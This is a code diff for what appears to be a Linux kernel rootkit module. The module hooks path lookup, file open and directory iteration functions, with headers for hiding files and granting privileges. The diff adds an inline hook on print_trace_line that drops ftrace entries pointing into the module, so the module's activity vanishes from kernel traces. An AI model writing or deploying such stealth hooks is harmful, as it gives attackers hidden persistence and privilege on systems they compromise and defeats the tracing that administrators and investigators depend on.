@@ -1,47 +1,11 @@
 #include <linux/kernel.h>
-#include <linux/sched.h>
-#include <linux/namei.h>
-#include "ftrace_helper.h"
-#include "hooks.h"
+#include <linux/trace_events.h>
+#include "internal/trace.h"
+#include "internal/various.h"
+#include "hook.h"
 #include "service.h"
 #include "privileges.h"
 #include "hide.h"
-
-/**
- * Some private definitions from the Linux kernel (5.4.0).
- * These are temporary - I will find a way to include these automatically.
- */
-struct open_flags {
-	int open_flag;
-	umode_t mode;
-	int acc_mode;
-	int intent;
-	int lookup_flags;
-};
-
-#define EMBEDDED_LEVELS 2
-struct nameidata {
-	struct path	path;
-	struct qstr	last;
-	struct path	root;
-	struct inode	*inode; /* path.dentry.d_inode */
-	unsigned int	flags;
-	unsigned	seq, m_seq;
-	int		last_type;
-	unsigned	depth;
-	int		total_link_count;
-	struct saved {
-		struct path link;
-		struct delayed_call done;
-		const char *name;
-		unsigned seq;
-	} *stack, internal[EMBEDDED_LEVELS];
-	struct filename	*name;
-	struct nameidata *saved;
-	struct inode	*link_inode;
-	unsigned	root_seq;
-	int		dfd;
-};
 
 /**
  * Original addresses of hooked functions  
@@ -52,6 +16,7 @@ static int (*orig_walk_component)(struct nameidata *nd, int flags);
 static struct file *(*orig_path_openat)(struct nameidata *nd, const struct open_flags *op, unsigned flags);
 static struct dentry *(*orig___lookup_hash)(const struct qstr *name, struct dentry *base, unsigned int flags);
 int (*orig_iterate_dir)(struct file *file, struct dir_context *ctx);
+enum print_line_t (*orig_print_trace_line)(struct trace_iterator *iter);
 
 /**
  * Hook that catches ioctl requests, and checks if it's a service request.
@@ -168,6 +133,41 @@ notrace int hook_iterate_dir(struct file *file, struct dir_context *ctx)
     return res;
 }
 
+notrace enum print_line_t hook_print_trace_line(struct trace_iterator *iter)
+{
+    enum print_line_t ret;
+
+    struct ftrace_entry *ftrace_entry;
+    struct ftrace_graph_ent_entry *ftrace_graph_ent_entry;
+    struct ftrace_graph_ret_entry *ftrace_graph_ret_entry;
+
+    switch (iter->ent->type) {
+        case TRACE_FN:
+            trace_assign_type(ftrace_entry, iter->ent);
+            if (within_module(ftrace_entry->ip, THIS_MODULE) || within_module(ftrace_entry->parent_ip, THIS_MODULE))
+                return TRACE_TYPE_HANDLED;
+            break;
+
+        case TRACE_GRAPH_ENT:
+            trace_assign_type(ftrace_graph_ent_entry, iter->ent);
+            if (within_module(ftrace_graph_ent_entry->graph_ent.func, THIS_MODULE))
+                return TRACE_TYPE_HANDLED;
+            break;
+
+        case TRACE_GRAPH_RET:
+            trace_assign_type(ftrace_graph_ret_entry, iter->ent);
+            if (within_module(ftrace_graph_ret_entry->ret.func, THIS_MODULE))
+                return TRACE_TYPE_HANDLED;
+            break;
+    }
+    
+    inline_hook_pause((void *)orig_print_trace_line);
+    ret = orig_print_trace_line(iter);
+    inline_hook_resume((void *)orig_print_trace_line);
+
+    return ret;
+}
+
 /**
  * Hook definitions.
  * Sometimes the symbol name of a kernel function can contain a prefix or suffix
@@ -182,15 +182,26 @@ static struct ftrace_hook hooks[] = {
     HOOK("walk_component", hook_walk_component, &orig_walk_component),
     HOOK("path_openat", hook_path_openat, &orig_path_openat),
     HOOK("__lookup_hash", hook___lookup_hash, &orig___lookup_hash),
-    HOOK("iterate_dir", hook_iterate_dir, &orig_iterate_dir),
+    HOOK("iterate_dir", hook_iterate_dir, &orig_iterate_dir)
 };
 
 inline int register_hooks(void)
 {
-    return fh_install_hooks(hooks, ARRAY_SIZE(hooks));
+    int err;
+
+    err = ftrace_install_hooks(hooks, ARRAY_SIZE(hooks));
+
+    if (err)
+        return err;
+
+    orig_print_trace_line = (enum print_line_t (*)(struct trace_iterator *iter))kallsyms_lookup_name("print_trace_line");
+    inline_hook_register((void *)orig_print_trace_line, (void *)hook_print_trace_line);
+
+    return 0;
 }
 
 inline void unregister_hooks(void)
 {
-    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
+    ftrace_remove_hooks(hooks, ARRAY_SIZE(hooks));
+    inline_hook_unregister((void *)orig_print_trace_line);
 }
